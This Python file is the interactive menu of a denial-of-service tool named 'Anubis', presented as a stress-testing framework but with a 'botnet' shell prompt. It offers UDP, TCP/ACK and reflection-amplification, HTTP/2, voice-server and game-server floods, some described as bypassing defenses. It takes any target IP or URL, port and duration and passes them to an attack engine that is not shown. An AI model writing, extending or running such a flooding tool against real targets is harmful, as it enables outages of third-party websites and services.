import os
import sys
import time
from colorama import Fore, Style, init
from methods import AnubisEngine

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear_screen()
    print(Fore.RED + """
    █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
    ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
    ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
    ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
    ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
    """)
    print(Fore.YELLOW + "    [ Network Stress & Security Testing Framework v4.0 ]")
    print(Fore.CYAN + "    [ High Concurrency 300M Architecture Enabled ]\n" + Style.RESET_ALL)

def main_menu():
    while True:
        banner()
        print(Fore.GREEN + "--- Layer 4 Methods ---")
        print(Fore.WHITE + "  [1] udp   - UDP flood, optimized for bypassing standard defenses.")
        print(Fore.WHITE + "  [2] tcp   - TCP flood + ACK Data flood + Reflection Amplification.")
        
        print(Fore.GREEN + "\n--- Layer 7 Methods ---")
        print(Fore.WHITE + "  [3] http  - HTTP/2 Custom Massive Flooder for high request-per-second rate.")
        
        print(Fore.GREEN + "\n--- Special Modules ---")
        print(Fore.WHITE + "  [4] voice - Static Data Flood for Voice servers / RTC payloads.")
        print(Fore.WHITE + "  [5] game  - Game Server Packet & Handshake Flood.")
        
        print(Fore.RED + "\n  [0] Exit Framework" + Style.RESET_ALL)
        
        choice = input(Fore.YELLOW + "\nanubis @ botnet ~ # " + Style.RESET_ALL).strip()
        
        if choice == '0':
            print(Fore.RED + "Exiting Anubis framework..." + Style.RESET_ALL)
            sys.exit(0)
            
        methods_map = {
            '1': 'udp',
            '2': 'tcp',
            '3': 'http',
            '4': 'voice',
            '5': 'game'
        }
        
        if choice in methods_map:
            selected_method = methods_map[choice]
            print(Fore.CYAN + f"\n[+] Selected Method: {selected_method.upper()}" + Style.RESET_ALL)
            
            target = input(Fore.GREEN + "Enter Target IP / URL: " + Style.RESET_ALL).strip()
            try:
                port = int(input(Fore.GREEN + "Enter Target Port (e.g., 80, 443, 27015): " + Style.RESET_ALL).strip())
            except ValueError:
                print(Fore.RED + "[-] Invalid port number!" + Style.RESET_ALL)
                time.sleep(1.5)
                continue
                
            try:
                duration = int(input(Fore.GREEN + "Enter Duration in seconds (Max 500): " + Style.RESET_ALL).strip())
                if duration > 500:
                    duration = 500
                    print(Fore.YELLOW + "[!] Duration capped at maximum 500 seconds." + Style.RESET_ALL)
            except ValueError:
                duration = 60
                print(Fore.YELLOW + "[!] Defaulting duration to 60 seconds." + Style.RESET_ALL)
                
            AnubisEngine.execute_attack(selected_method, target, port, duration)
            input(Fore.YELLOW + "\nPress Enter to return to main menu..." + Style.RESET_ALL)
        else:
            print(Fore.RED + "[-] Invalid selection, please try again." + Style.RESET_ALL)
            time.sleep(1.5)

if __name__ == "__main__":
    main_menu()
